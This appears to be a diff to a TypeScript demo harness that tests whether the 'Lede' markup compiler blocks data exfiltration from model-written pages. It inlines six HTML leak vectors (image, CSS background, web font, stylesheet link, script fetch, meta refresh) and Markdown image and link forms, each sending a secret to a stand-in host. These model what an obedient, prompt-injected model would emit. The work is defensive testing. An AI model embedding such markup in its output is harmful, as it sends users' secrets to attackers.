@@ -1,4 +1,4 @@
-// Rerunnable exfiltration demo: `node demos/exfil/run.ts`. See README.md. It calls no model: the fixtures are fixed worst-case outputs.
+// Rerunnable exfiltration demo: `node demos/exfil/run.ts`. See README.md. It calls no model: the pages are fixed worst-case outputs.
 import { execFileSync } from 'node:child_process';
 import { readFileSync } from 'node:fs';
 import { createRequire } from 'node:module';
@@ -16,59 +16,76 @@ const require = createRequire(new URL('../../bench/src/shot.ts', import.meta.url
 export const EXIT_MISMATCH = 1;
 export const EXIT_NO_CHROMIUM = 3;
 
+/** The six markup vectors, one line each; `@@LEAK@@` is where the leak URL goes. Raw HTML and Lede's `html:` block carry the same line. */
+const VECTORS = {
+  img: '<img src="@@LEAK@@" width="1" height="1" alt="">',
+  'css-background': '<p style="background:url(@@LEAK@@)">Details</p>',
+  font: '<style>@font-face{font-family:x;src:url(@@LEAK@@)}body{font-family:x,sans-serif}</style>',
+  'link-stylesheet': '<link rel="stylesheet" href="@@LEAK@@">',
+  'script-fetch': '<script>fetch("@@LEAK@@",{mode:"no-cors"})</script>',
+  'meta-refresh': '<meta http-equiv="refresh" content="0;url=@@LEAK@@">',
+};
+type Vector = keyof typeof VECTORS;
+
+// The worst case: what a fully obedient model writes for brief.txt, in each form.
+const TITLE = 'Incident summary';
+const PARA = 'The database failover completed at 02:14. Customer impact was limited to the EU region.';
+const SRC = {
+  html: (v: Vector) => `<h1>${TITLE}</h1>\n<p>${PARA}</p>\n${VECTORS[v]}\n`,
+  markdown: `# ${TITLE}\n\n${PARA}\n\n![](@@LEAK@@)\n`,
+  ledeHtml: (v: Vector) => `# ${TITLE}\n${PARA}\n\nhtml: ${VECTORS[v]}\n`,
+  ledeImage: `# ${TITLE}\n${PARA}\n\nimage @@LEAK@@ "status chart"\n`,
+  ledeLink: `# ${TITLE}\n${PARA}\n\nSee the [full incident notes](@@LEAK@@).\n`,
+};
+
 interface Case {
   id: string;
   group: string;
   label: string;
-  fixture: string;
-  /** `raw` serves the fixture as HTML, `markdown` renders it first, `lede` compiles it with `flags`. */
+  source: string;
+  /** `raw` serves the source as HTML, `markdown` renders it first, `lede` compiles it with `flags`. */
   kind: 'raw' | 'markdown' | 'lede';
   flags?: string[];
   scheme?: 'http' | 'https';
   click?: boolean;
 }
 
-const VECTORS = ['img', 'css-background', 'font', 'link-stylesheet', 'script-fetch', 'meta-refresh'] as const;
-const raw = (v: string): Case => ({ id: `raw-html/${v}`, group: 'Raw HTML', label: `HTML: ${v}`, fixture: `html-${v}.html`, kind: 'raw' });
-const lede = (id: string, group: string, label: string, fixture: string, flags: string[] = [], extra: Partial<Case> = {}): Case => ({
+const VECTOR_NAMES = Object.keys(VECTORS) as Vector[];
+const raw = (v: Vector): Case => ({ id: `raw-html/${v}`, group: 'Raw HTML', label: `HTML: ${v}`, source: SRC.html(v), kind: 'raw' });
+const lede = (id: string, group: string, label: string, source: string, flags: string[] = [], extra: Partial<Case> = {}): Case => ({
   id,
   group,
   label,
-  fixture,
+  source,
   kind: 'lede',
   flags,
   ...extra,
 });
-const html = (v: string) => `lede-html-${v}.lede`;
+const DEFAULT = 'Lede, default flags';
+const ALLOW = 'Opt-out: --allow-remote';
+const ARTIFACT = 'Opt-out: --artifact';
 
 export const CASES: Case[] = [
-  ...VECTORS.map(raw),
-  { id: 'markdown/image', group: 'Markdown', label: 'Markdown: ![](url) image', fixture: 'markdown-image.md', kind: 'markdown' },
-  lede('lede/image', 'Lede, default flags', 'Lede: image line', 'lede-image.lede'),
-  ...VECTORS.map((v) => lede(`lede/html-${v}`, 'Lede, default flags', `Lede: html: block, ${v}`, html(v))),
-  lede('lede/link-unclicked', 'Lede, default flags', 'Lede: link, reader does not click', 'lede-link.lede'),
-  lede('lede/link-clicked', 'Not blocked', 'Lede: link, reader clicks it', 'lede-link.lede', [], { click: true }),
-  lede('lede/allow-remote/image-https', 'Opt-out: --allow-remote', 'Lede --allow-remote: image, https URL', 'lede-image.lede', [
-    '--allow-remote',
-  ]),
-  lede(
-    'lede/allow-remote/image-http',
-    'Opt-out: --allow-remote',
-    'Lede --allow-remote: image, http URL',
-    'lede-image.lede',
-    ['--allow-remote'],
-    {
-      scheme: 'http',
-    },
+  ...VECTOR_NAMES.map(raw),
+  { id: 'markdown/image', group: 'Markdown', label: 'Markdown: ![](url) image', source: SRC.markdown, kind: 'markdown' },
+  lede('lede/image', DEFAULT, 'Lede: image line', SRC.ledeImage),
+  ...VECTOR_NAMES.map((v) => lede(`lede/html-${v}`, DEFAULT, `Lede: html: block, ${v}`, SRC.ledeHtml(v))),
+  lede('lede/link-unclicked', DEFAULT, 'Lede: link, reader does not click', SRC.ledeLink),
+  lede('lede/link-clicked', 'Not blocked', 'Lede: link, reader clicks it', SRC.ledeLink, [], { click: true }),
+  lede('lede/allow-remote/image-https', ALLOW, 'Lede --allow-remote: image, https URL', SRC.ledeImage, ['--allow-remote']),
+  lede('lede/allow-remote/image-http', ALLOW, 'Lede --allow-remote: image, http URL', SRC.ledeImage, ['--allow-remote'], {
+    scheme: 'http',
+  }),
+  lede('lede/allow-remote/html-img', ALLOW, 'Lede --allow-remote: html: img', SRC.ledeHtml('img'), ['--allow-remote']),
+  ...VECTOR_NAMES.map((v) =>
+    lede(`lede/unsafe-html/${v}`, 'Opt-out: --unsafe-html', `Lede --unsafe-html: ${v}`, SRC.ledeHtml(v), ['--unsafe-html']),
   ),
-  lede('lede/allow-remote/html-img', 'Opt-out: --allow-remote', 'Lede --allow-remote: html: img', html('img'), ['--allow-remote']),
-  ...VECTORS.map((v) => lede(`lede/unsafe-html/${v}`, 'Opt-out: --unsafe-html', `Lede --unsafe-html: ${v}`, html(v), ['--unsafe-html'])),
-  lede('lede/artifact/image', 'Opt-out: --artifact', 'Lede --artifact: image line, no host policy', 'lede-image.lede', ['--artifact']),
-  lede('lede/artifact/allow-remote/image', 'Opt-out: --artifact', 'Lede --artifact --allow-remote: image', 'lede-image.lede', [
+  lede('lede/artifact/image', ARTIFACT, 'Lede --artifact: image line, no host policy', SRC.ledeImage, ['--artifact']),
+  lede('lede/artifact/allow-remote/image', ARTIFACT, 'Lede --artifact --allow-remote: image', SRC.ledeImage, [
     '--artifact',
     '--allow-remote',
   ]),
-  lede('lede/artifact/unsafe-html/script-fetch', 'Opt-out: --artifact', 'Lede --artifact --unsafe-html: script', html('script-fetch'), [
+  lede('lede/artifact/unsafe-html/script-fetch', ARTIFACT, 'Lede --artifact --unsafe-html: script', SRC.ledeHtml('script-fetch'), [
     '--artifact',
     '--unsafe-html',
   ]),
@@ -84,20 +101,27 @@ export interface Result {
 
 function page(c: Case): string {
   const url = `${c.scheme ?? 'https'}://${HOST}/leak?q=${SECRET}`;
-  const text = readFileSync(`${dir}fixtures/${c.fixture}`, 'utf8').replaceAll('@@LEAK@@', url);
-  if (c.kind === 'raw') return `<!doctype html>\n<meta charset="utf-8">\n${text}`;
-  if (c.kind === 'markdown') {
+  const text = c.source.replaceAll('@@LEAK@@', url);
+  let out: string;
+  if (c.kind === 'raw') out = `<!doctype html>\n<meta charset="utf-8">\n${text}`;
+  else if (c.kind === 'markdown') {
     // markdown-it is a bench dependency. Its defaults (html off, images on) are what a typical chat host gives a reply.
     const MarkdownIt = require('markdown-it') as new () => { render(s: string): string };
-    return `<!doctype html>\n<meta charset="utf-8">\n${new MarkdownIt().render(text)}`;
+    out = `<!doctype html>\n<meta charset="utf-8">\n${new MarkdownIt().render(text)}`;
+  } else {
+    out = execFileSync(process.execPath, [cli, 'build', '-', ...(c.flags ?? [])], {
+      input: text,
+      encoding: 'utf8',
+      stdio: ['pipe', 'pipe', 'ignore'],
+    });
+    // A real artifact host wraps the fragment in its own page; here the wrapper is bare, so it adds no policy.
+    if (c.flags?.includes('--artifact')) out = `<!doctype html>\n<meta charset="utf-8">\n${out}`;
   }
-  const out = execFileSync(process.execPath, [cli, 'build', '-', ...(c.flags ?? [])], {
-    input: text,
-    encoding: 'utf8',
-    stdio: ['pipe', 'pipe', 'ignore'],
-  });
-  // A real artifact host wraps the fragment in its own page; here the wrapper is bare, so it adds no policy.
-  return c.flags?.includes('--artifact') ? `<!doctype html>\n<meta charset="utf-8">\n${out}` : out;
+  // A row whose page never carries the URL would read 0 for the wrong reason. Every row that writes markup through (raw HTML,
+  // Markdown, an opt-out, a link) must carry it; a default-flag row shares its source with one of these.
+  const armed = c.kind !== 'lede' || c.click === true || (c.flags ?? []).some((f) => f === '--unsafe-html' || f === '--allow-remote');
+  if (armed && !out.includes(url)) throw new Error(`${c.id}: the page does not carry the leak URL, so its count would test nothing`);
+  return out;
 }
 
 type Browser = Awaited<ReturnType<typeof chromium.launch>>;
